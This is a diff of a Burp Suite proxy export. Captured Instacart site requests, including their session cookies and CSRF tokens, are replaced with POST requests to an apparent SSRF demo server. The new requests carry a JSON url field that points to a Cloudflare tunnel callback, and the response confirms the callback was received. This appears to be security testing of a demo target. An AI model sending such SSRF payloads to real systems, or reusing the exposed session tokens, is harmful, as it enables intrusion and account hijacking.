@@ -23,7 +23,7 @@
 <!ATTLIST response base64 (true|false) "false">
 <!ELEMENT comment (#PCDATA)>
 ]>
-<items burpVersion="2025.1.4" exportTime="Fri Sep 05 14:53:15 CDT 2025">
+<items burpVersion="2025.1.4" exportTime="Fri Sep 05 15:08:08 CDT 2025">
   <item>
     <time>Fri Sep 05 13:48:02 CDT 2025</time>
     <url><![CDATA[https://dollarama.instacart.com/ahoy/visits]]></url>
@@ -150,33 +150,30 @@ X-Amz-Cf-Id: MJhLq5EulOdC3_GFAOnxKHv5OOaHoL2HP2Du9J736eiyBot0afA1Qw==
   </item>
   <item>
     <time>Fri Sep 05 13:53:12 CDT 2025</time>
-    <url><![CDATA[https://enterprise-status.instacart.com/forgot_password]]></url>
-    <host ip="18.161.97.121">enterprise-status.instacart.com</host>
+    <url><![CDATA[https://ssrfdemo.onrender.com/fetch]]></url>
+    <host ip="">ssrfdemo.onrender.com</host>
     <port>443</port>
     <protocol>https</protocol>
     <method><![CDATA[POST]]></method>
     <path><![CDATA[/forgot_password]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[POST /forgot_password HTTP/2
-Host: enterprise-status.instacart.com
-Cookie: ajs_anonymous_id=ea2155a8-97ff-4b0e-b45e-39cf0739f40e; fpc_bpm=6c408fe3-8b36-4eb3-845158ee784ea186; _gcl_au=1.1.2092369738.1757096439; _scid=fThUJkdGap-1v9ZjbqZqSXFNEKdvn5uL; _sctr=1%7C1757048400000; _ga_VL5WVTXMWP=GS2.1.s1757097305$o1$g1$t1757097519$j13$l0$h0; _ga=GA1.1.206219771.1757097305; _ga_TS6NTR6J66=GS2.1.s1757097305$o1$g0$t1757097308$j57$l0$h0; shoppers_instacart_session=ZjJBblo0ODN4cW9WTDRhYmZ1MTFiNUtKeiswKy9Pa1VITGFHUXJMK2ROemk0RDJtUUJTcUtJQi9kZzYrK3NVWms1VHpqaXNYSXJacHp0c3BSaWZ5S0FqMVZrdnVwTU9QbEVyNkYxTDJyazhtQWZ6cmdYSU1odkZORG1PZGI4eUoxZHpvL3dFRyttOUxjS0tMSlRsaER3PT0tLU9pRSs5RWJKRWovYTlUSkJIajcwWWc9PQ%3D%3D--a284366cb4b21bf28cb51803cf47037da3a143fd; _ga_7JY7T788PK=GS2.1.s1757097523$o1$g1$t1757097603$j60$l0$h0; forterToken=f7fe3fe0a0154968b2655c5e926e2edf_1757097973894__UDF43-m4_24ck_; ak_bmsc=64EA26AC6BF091BE885C0A4F5633250B~000000000000000000000000000000~YAAQJV+MT0qwkfGYAQAANH80Gx21L7tHqeiuJSuF9Dni/pya80jWfFjRYUU/zsVQyeCABF/tiD18jwvGPaONBIiLo61tmU3nRho3Eod1zWVyv286wJXHO/vTDq8GQt6IPesdnkbPyjeGU7HRu+OXCISpn+A2rXvCUUEm5z4E3JW4Zs7CgdU4m+nmi3zH9mKk+qLFAk9/UxJpy75IhyrlG/7Nphx8U6cP8RxbnVpDhI3DTKwUUfFJAQQJaAxQJ//UXGxlrVSyDlZV8Ri7/2YywI8q09JQsecJ5nVExyJD/Xz5RGrbDduHujdxoo2oHofVxomkMDcT0SX+MUwQCg3wkjT6XQFTIxAF0D7WuQHI5mW01v7/ozXIvg2bIOLxZksBYiNl7uIx/EePLyEjaXSI+Oyq9p1do9DxTJOvTtTSwVZiI8ffCfTBtUHJ/H+MgdMy/Tt7U1vnVTC4rwgYf6UaAo4nwISio3dKJzU5B46PlPp+HA8WKn6HSyd9GLcGMr/O6XulMhtGyXsqjnESLwPoTT4Tiw==; bm_mi=3B82EC3A3D14F2AE53C6AADEFDF5CDF5~YAAQJV+MTzawkfGYAQAAwGo0Gx3OdASLAa8dBUD9ODopRZiZUSZautr8AszWd+h+HQg7sGkn4y54vV9afFaT12QLwwF6oHH/gHxLAAQF920QRhKIZHOL6b81bwCgPfr2FHQG6PSKtO+sUkRM+1aPQKf25Nnr8dQG3VHk2rQg8WQrAIm84xL0U1zJbxVRpoXLFGl6kLiDoQHXeFl2NNrf6EcFzHPabH1oc2H/MTuhXWxlLVMJLv6yTS4ejaODhh8xPEWyCItzjgC/w/AYmytzy1bHQ40CxXgFZy6JVehsFwFaktWLkxGp4C8xMp95WbHRErFUPxa5YuFsCwc2tiHoxxNZ4qw1UFUhJTO50XtIDw==~1; bm_sv=339C6ACE0A4AA7F78E5D6ECB724745A5~YAAQJV+MT1KwkfGYAQAAwo40Gx38motXyHbBZY0ZHC1X4W3vJH3ydpM2l9XV6u5xdywszrdvb5TvUrIZwmzvrVFA5cO26jmpXJDpz953OTs0YbMdmxSynexyzvvnsDmmMyYPJabTdxB9yrfpMBzb2FzmD6YZKdKsVqEFkYQCSDUANXjRd1r5hyuWsgx2ZKfF9x2OGUyXfo3oijuHVhXonre7+j5ACMHcxTdJ8uhcV5/gfgsAda6jAZvQGsDYeQjZRZmt~1; AMCV_98CF678254E93B1B0A4C98A5%40AdobeOrg=179643557%7CMCMID%7C32052525407141275403149641620869998195%7CMCAAMLH-1757702816%7C6%7CMCAAMB-1757702816%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1757105216s%7CNONE%7CvVersion%7C5.5.0; AMCVS_98CF678254E93B1B0A4C98A5%40AdobeOrg=1; s_cc=true; _uetsid=06cf2b608a8511f087a3e9c9c9f94d50; _uetvid=06cf13508a8511f0b6648300830ef8b5; _scid_r=jbhUJkdGap-1v9ZjbqZqSXFNEKdvn5uLKZ53jw; _spsess=WWZDYWhEUXdVZ0x1ZHJNZnEycEpkYW1iVFMweFkzd3V6WXYwWlpxRW5mK0NLb3F0by90aXpTc29qUDRIMkJyT3VPTjZnMzExemRjblFZRERDdjNUYkNPSXhZL1oxVk9Pc2QrYXk1TGhYK0RYSkpEbktaUS9vcEF0aTI2bEc2eXBiU0ROcmlvMFVLaGl2Z0ZaTW85ZHl0MHA4MHNrTGF6R2pzR0pRUXltR2R3MEZEclFXQVJxTllYcGNCYzg0b2ZZRnZpQXdrbzhncU9NUTR1b1JGcFh5b29XK0NpS0RWV3poMnJlRWZsbWRZWW5lRUJURkM2TFlnSlJjT2VqZUpTa1FXT2V4eURyRG9BSUQzUUY0cERJR3M4NllFSmxGWlpLUnBqYTR0ZCtJYXVmYjdsdkszQVduN1VhQVRFM20vZHlkSnJZMjFaZFhhSU1DUGVQelVod001cHgwQnRtUG5idy81RzlrY1E5WVJZPS0tL0pKZFZnMWEvYXBGN2JzY05mZ1VDZz09--b7b87e6144a09f970e1c21b04ce2714a6edbe451
+    <request base64="false"><![CDATA[POST /fetch/ HTTP/2
+Host: ssrfdemo.onrender.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://enterprise-status.instacart.com/forgot_password
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 124
-Origin: https://enterprise-status.instacart.com
+Accept-Encoding: gzip, deflate, br, zstd
+Alt-Used: ssrfdemo.onrender.com
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
+Sec-Fetch-Site: none
 Sec-Fetch-User: ?1
 Priority: u=0, i
-Te: trailers
+Content-Type: application/json
+Content-Length: 81
 
-authenticity_token=uGYlc9r6B2737nRmiyi9JMg-Cplutz_uaW_eajHPtRraTUfP6cH46NDJr1GDdfL_Wci6eGyMoAH9XlIEMKlbgw&email=test&button=]]></request>
+{"url":"https://fails-quickly-lawrence-treating.trycloudflare.com/callback"}]]></request>
     <status>200</status>
     <responselength>33149</responselength>
     <mimetype>HTML</mimetype>
@@ -933,60 +930,39 @@ X-Amz-Cf-Id: jcbAuy-346iyjF81zO6Cg6Zl6w5_Xv-1lRy9loJ-VPjHYBn49U_RWw==
     <method><![CDATA[POST]]></method>
     <path><![CDATA[/ahoy/visits]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[POST /ahoy/visits HTTP/2
-Host: iamfoodsmart.instacart.com
-Cookie: ajs_anonymous_id=ea2155a8-97ff-4b0e-b45e-39cf0739f40e; fpc_bpm=6c408fe3-8b36-4eb3-845158ee784ea186; _gcl_au=1.1.2092369738.1757096439; _scid=fThUJkdGap-1v9ZjbqZqSXFNEKdvn5uL; _sctr=1%7C1757048400000; _ga_VL5WVTXMWP=GS2.1.s1757097305$o1$g1$t1757097519$j13$l0$h0; _ga=GA1.1.206219771.1757097305; _ga_TS6NTR6J66=GS2.1.s1757097305$o1$g0$t1757097308$j57$l0$h0; shoppers_instacart_session=ZjJBblo0ODN4cW9WTDRhYmZ1MTFiNUtKeiswKy9Pa1VITGFHUXJMK2ROemk0RDJtUUJTcUtJQi9kZzYrK3NVWms1VHpqaXNYSXJacHp0c3BSaWZ5S0FqMVZrdnVwTU9QbEVyNkYxTDJyazhtQWZ6cmdYSU1odkZORG1PZGI4eUoxZHpvL3dFRyttOUxjS0tMSlRsaER3PT0tLU9pRSs5RWJKRWovYTlUSkJIajcwWWc9PQ%3D%3D--a284366cb4b21bf28cb51803cf47037da3a143fd; _ga_7JY7T788PK=GS2.1.s1757097523$o1$g1$t1757097603$j60$l0$h0; forterToken=f7fe3fe0a0154968b2655c5e926e2edf_1757097973894__UDF43-m4_24ck_; _scid_r=jLhUJkdGap-1v9ZjbqZqSXFNEKdvn5uLKZ53jg; _uetsid=06cf2b608a8511f087a3e9c9c9f94d50; _uetvid=06cf13508a8511f0b6648300830ef8b5; ak_bmsc=64EA26AC6BF091BE885C0A4F5633250B~000000000000000000000000000000~YAAQJV+MT0qwkfGYAQAANH80Gx21L7tHqeiuJSuF9Dni/pya80jWfFjRYUU/zsVQyeCABF/tiD18jwvGPaONBIiLo61tmU3nRho3Eod1zWVyv286wJXHO/vTDq8GQt6IPesdnkbPyjeGU7HRu+OXCISpn+A2rXvCUUEm5z4E3JW4Zs7CgdU4m+nmi3zH9mKk+qLFAk9/UxJpy75IhyrlG/7Nphx8U6cP8RxbnVpDhI3DTKwUUfFJAQQJaAxQJ//UXGxlrVSyDlZV8Ri7/2YywI8q09JQsecJ5nVExyJD/Xz5RGrbDduHujdxoo2oHofVxomkMDcT0SX+MUwQCg3wkjT6XQFTIxAF0D7WuQHI5mW01v7/ozXIvg2bIOLxZksBYiNl7uIx/EePLyEjaXSI+Oyq9p1do9DxTJOvTtTSwVZiI8ffCfTBtUHJ/H+MgdMy/Tt7U1vnVTC4rwgYf6UaAo4nwISio3dKJzU5B46PlPp+HA8WKn6HSyd9GLcGMr/O6XulMhtGyXsqjnESLwPoTT4Tiw==; bm_mi=3B82EC3A3D14F2AE53C6AADEFDF5CDF5~YAAQJV+MTzawkfGYAQAAwGo0Gx3OdASLAa8dBUD9ODopRZiZUSZautr8AszWd+h+HQg7sGkn4y54vV9afFaT12QLwwF6oHH/gHxLAAQF920QRhKIZHOL6b81bwCgPfr2FHQG6PSKtO+sUkRM+1aPQKf25Nnr8dQG3VHk2rQg8WQrAIm84xL0U1zJbxVRpoXLFGl6kLiDoQHXeFl2NNrf6EcFzHPabH1oc2H/MTuhXWxlLVMJLv6yTS4ejaODhh8xPEWyCItzjgC/w/AYmytzy1bHQ40CxXgFZy6JVehsFwFaktWLkxGp4C8xMp95WbHRErFUPxa5YuFsCwc2tiHoxxNZ4qw1UFUhJTO50XtIDw==~1; bm_sv=339C6ACE0A4AA7F78E5D6ECB724745A5~YAAQJV+MT1KwkfGYAQAAwo40Gx38motXyHbBZY0ZHC1X4W3vJH3ydpM2l9XV6u5xdywszrdvb5TvUrIZwmzvrVFA5cO26jmpXJDpz953OTs0YbMdmxSynexyzvvnsDmmMyYPJabTdxB9yrfpMBzb2FzmD6YZKdKsVqEFkYQCSDUANXjRd1r5hyuWsgx2ZKfF9x2OGUyXfo3oijuHVhXonre7+j5ACMHcxTdJ8uhcV5/gfgsAda6jAZvQGsDYeQjZRZmt~1; AMCV_98CF678254E93B1B0A4C98A5%40AdobeOrg=179643557%7CMCMID%7C32052525407141275403149641620869998195%7CMCAAMLH-1757702816%7C6%7CMCAAMB-1757702816%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1757105216s%7CNONE%7CvVersion%7C5.5.0; AMCVS_98CF678254E93B1B0A4C98A5%40AdobeOrg=1; s_cc=true; ahoy_visit=fb93cbd7-12ed-4386-b104-3f7045293a05; ahoy_track=true; ahoy_visitor=2c6ba9d2-79f0-42fc-843d-d7158def9439; build_sha=c27e69482ce558c6064666550c97cc2e857c996e; device_uuid=6ce0ab32-523f-4544-9383-0cb1065a9aa5; _instacart_session_id=T1BKd2N5d0E3M2NBNVlGZDNjalJvcC9WSUhmRHYwQ1dDRGdVeUhUTjZWSlZYVkNneE9zQVZneUxuWHJwWkw5dlJxNWdYZ1RFU0JxdzRyM3hZTFEwS1pVR091U1Z3VFo2dlZTTVZTb1FLSVQxOEV1Yk4rVkpDS0QwZUFCeGNSMFQ2SlFicE41cEg3SzFjUzFtZnl2TW55TVBvTURWWFN0VTUrM0xvYWJzczh2dVFXR3Ftb3dpY2t0bE56QWJjcC8yRVZrT0xKYitoazY0VCtkSmcxdGxjdm9NZDBna3pPSmRTbXVWcy85VTc5MUw4bWhzUVl4Z09Od3c2ZjRpOG10ZjVLWmxSbUduRXVtREhvRG56enpuVDV3OE44T1gzekl0cHVQSjFwYTlEWDYvTlNlZCtNTS9YN2hKU2h6ZHFQMmZMN1Iyb1FHY3JUN3ZHcEg0bDFLWmpvSVVJVkxGc3hBSXIyN1RrZ3hkb2pzPS0tN3VpdTg3bURoY1RrYmhYWUtrYUY4Zz09--deaded68fa7d4d221a051ce4cf288dfa4363e429
+    <request base64="false"><![CDATA[POST /fetch/ HTTP/2
+Host: ssrfdemo.onrender.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: application/json, text/javascript, */*; q=0.01
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://iamfoodsmart.instacart.com/terms
-Content-Type: application/json; charset=utf-8
-X-Csrf-Token: K0-pfWGhMHefjtAIXmqruBfFMthpxg1UUiBwDNhzNmFAPeD8tBt3hgdOi8wcrdQ4i3P3SPym6nLuRCkIZl6TvQ
-X-Requested-With: XMLHttpRequest
-Content-Length: 284
-Origin: https://iamfoodsmart.instacart.com
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
+Accept-Encoding: gzip, deflate, br, zstd
+Alt-Used: ssrfdemo.onrender.com
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Content-Type: application/json
+Content-Length: 81
 
-{"visit_token":"fb93cbd7-12ed-4386-b104-3f7045293a05","visitor_token":"2c6ba9d2-79f0-42fc-843d-d7158def9439","platform":"Web","landing_page":"https://iamfoodsmart.instacart.com/terms","screen_width":1920,"screen_height":1080,"js":true,"referrer":"https://iamfoodsmart.instacart.com/"}]]></request>
+{"url":"https://fails-quickly-lawrence-treating.trycloudflare.com/callback"}]]></request>
     <status>200</status>
     <responselength>2235</responselength>
     <mimetype>JSON</mimetype>
     <response base64="false"><![CDATA[HTTP/2 200 OK
-Content-Type: application/json; charset=utf-8
-Date: Fri, 05 Sep 2025 18:48:32 GMT
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-Server: nginx
-Access-Control-Allow-Origin: https://iamfoodsmart.instacart.com
-Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
-Access-Control-Expose-Headers: 
-Access-Control-Max-Age: 7200
-Access-Control-Allow-Credentials: true
-X-Frame-Options: SAMEORIGIN
-X-Xss-Protection: 0
-X-Content-Type-Options: nosniff
-X-Download-Options: noopen
-X-Permitted-Cross-Domain-Policies: none
-Referrer-Policy: strict-origin-when-cross-origin
-Set-Cookie: build_sha=c27e69482ce558c6064666550c97cc2e857c996e; path=/; Secure; SameSite=None
-Set-Cookie: ahoy_visit=fb93cbd7-12ed-4386-b104-3f7045293a05; path=/; expires=Fri, 05 Sep 2025 22:48:32 GMT; Secure; SameSite=None
-Set-Cookie: _instacart_session_id=b1BhWHR5L2c1MmVOT2FoOU5IYUVuR1hrbGdvT0tXblZTMlN1czEyeVZtbDE1QWJocnRuYzg3QmI0dHJMK2hmeXBYRjlrWis3K0pKaXVya1d5VS9HQXZLR0FZVlQ0dkhjMHR2dW44eEpTYXN6dTFLUytuaEtxQTdBOWRQZ1hkV055KzlrM0FvcDR2T1BNRENiNzdyL3kvQ3J3aTRnL1pKbWU0OFd0dnBET1cxbm1mZ0UzdVhWOVBESmJVSVhMTTlUcmg4ckZITFdVblRidmJnNlluYStWOFh4TlMySDJUQURxU29XalZvQ0l0N3R5aThDQm9nN1ovWWVBNENYNUhwYjh4SWtYTWt0T3V1MzRGOElIa0xlOHZjYVErREdjTU9CMlUzcGRjL0NNWHdMdHdtanpGbHBHdm5PQktaVmUxK1hzdGxqWjBMMTFBcXMxVzRTZTFvbVU2RHQxckRKanRKS0NONFRqaEVIcjgwPS0tc0lDRndPS0R5bG5vcklKaUhZNTBiZz09--04266a9537cb4246bec342dbedc6aaef1ad39055; path=/; secure; HttpOnly; SameSite=None
-Set-Cookie: ahoy_track=; path=/; max-age=0; expires=Thu, 01 Jan 1970 00:00:00 GMT; Secure; SameSite=None
-Etag: W/"39b231c0302bdff27586d9a4fc2dc833"
-Cache-Control: max-age=0, private, must-revalidate
-X-Request-Id: bffc1e8a-479f-4f0a-97aa-5153ccb43f3d
-X-Runtime: 0.051477
-Vary: Accept, Origin
-X-Cache: Miss from cloudfront
-Via: 1.1 8db38b2985895531f24131b50e53541c.cloudfront.net (CloudFront)
-X-Amz-Cf-Pop: MRS52-P5
+Date: Fri, 05 Sep 2025 20:50:10 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 310
+Rndr-Id: 8ef1a8a8-f026-4aef
+Vary: Accept-Encoding
+X-Render-Origin-Server: Werkzeug/3.1.3 Python/3.13.4
+Cf-Cache-Status: DYNAMIC
+Server: cloudflare
+Cf-Ray: 97a898e6ce7a5bce-TUN
 Alt-Svc: h3=":443"; ma=86400
-X-Amz-Cf-Id: 4yoz56x-3kBwxuYRHkvUC9ugdu858RTYNK7Nr1ltnMAnp-6Bu0GV3w==
 
-{"visit_token":"fb93cbd7-12ed-4386-b104-3f7045293a05","visitor_token":"2c6ba9d2-79f0-42fc-843d-d7158def9439","visit_id":"fb93cbd7-12ed-4386-b104-3f7045293a05","visitor_id":"2c6ba9d2-79f0-42fc-843d-d7158def9439"}]]></response>
+{"status":"success","message":"SSRF callback received!","timestamp":"2025-09-05T15:50:10.022944","method":"GET","url":"https://fails-quickly-lawrence-treating.trycloudflare.com/callback?origin=https://ssrfdemo.onrender.com/index/?secondparam=https://fails-quickly-lawrence-treating.trycloudflare.com/callback"}]]></response>
     <comment></comment>
   </item>
   <item>
